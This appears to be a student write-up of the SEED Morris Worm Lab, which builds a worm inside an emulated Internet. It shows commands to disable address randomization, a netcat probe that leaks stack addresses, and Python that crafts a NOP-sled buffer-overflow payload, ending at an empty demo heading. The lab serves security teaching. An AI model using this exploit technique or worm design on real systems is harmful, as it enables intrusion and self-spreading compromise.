# The Morris Worm Lab

The Morris worm (November 1988) was one of the oldest computer worms distributed via the Internet, and the first to gain significant mainstream media attention [1]. While it is old, the techniques used by most worms today are still the same, such as the WannaCry ransomware in 2017. They involve two main parts: attack and self-duplication. The attack part exploits a vulnerability (or a few of them), so a worm can get entry to another computer. The self-duplication part is to send a copy of itself to the compromised machine, and then launch the attack from there. A detailed analysis of the Morris worm was given by Spafford [2]. The goal of this lab is to help students gain a better understanding of the behavior of worms, by writing a simple worm and testing it in a contained environment (an Internet emulator). Although the title of this lab is called Morris worm, the underneath technique used is quite generic. We have broken down the technique into several tasks, so students can build the worm incrementally. For testing, we built two emulated Internets, a small one and a larger one. Students can release their worms in each of these Internets, and see how their worms spread across the entire emulated Internet. The lab covers the following topics:

- Buffer-overflow attack
- Worm’s self-duplication and propagation behavior
- The SEED Internet emulator
- Network tools

## Task 1: Attack the First Target

The worm exploit the Buffer-overflow vulnerability to allow the worm to run on the target machine.

### Step 1: Disable the Address Randomization

> Note: This kernel parameter is global, so once we turn it off from the host machine, all the containers are affected.

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0 
```

All the non-router containers in the emulator run the **same vulnerable server**. With the address randomization disabled, all the servers will have the identical parameters, the addresses of the buffer and the value of the frame pointers will be the same across all the containers. The attack part is the same as the Level-1 task in the Buffer-Overflow Lab, so if students have worked on that lab before, they can reuse the code from that lab here. We will not duplicate the instruction in this lab. Students can read the lab description of the Buffer-Overflow Lab (server version) to learn the setup of the server and the guidelines on the attack.

### Step 2: Generate the malicious payload for the buffer-overflow attack

#### Attack Idea

![](assets/buffer_overflow_attack.png)

#### 2.1. send a hello message to the target server for getting the address of the buffer and the frame pointer. The server will print out the address of the buffer and the frame pointer. The server will also print out the size of the input message. The address of the buffer and the frame pointer are printed in hexadecimal format.

```bash
root@7e27f0bf5973:/# echo hello | nc -w2 10.151.0.71 9090
as151h-host_0-10.151.0.71           | Starting stack
as151h-host_0-10.151.0.71           | Input size: 6
as151h-host_0-10.151.0.71           | Frame Pointer (ebp) inside bof():  0xffffd5e8
as151h-host_0-10.151.0.71           | Buffer's address inside bof():     0xffffd578
as151h-host_0-10.151.0.71           | ==== Returned Properly ====
```

#### 2.2 Craft the malicious payload for injecting the shellcode into the target server.

code snippet:

```python
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   base_pointer   = 0xffffd5e8
   buffer_address = 0xffffd578

   offset = base_pointer - buffer_address + 4
   ret    = buffer_address + 500 - len(shellcode)

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)
```

#### 2.3. Run the attack

```bash
root@f2c7a61d156d:~# ./worm.py
The worm has arrived on this host ^_^
**********************************
>>>>> Attacking 10.151.0.71 <<<<<
**********************************
PING 1.2.3.4 (1.2.3.4) 56(84) bytes of data.
```

Server Output:

```bash
as151h-host_0-10.151.0.71           | Starting stack
as151h-host_0-10.151.0.71           | (^_^) Shellcode is running (^_^)
```

#### DEMO


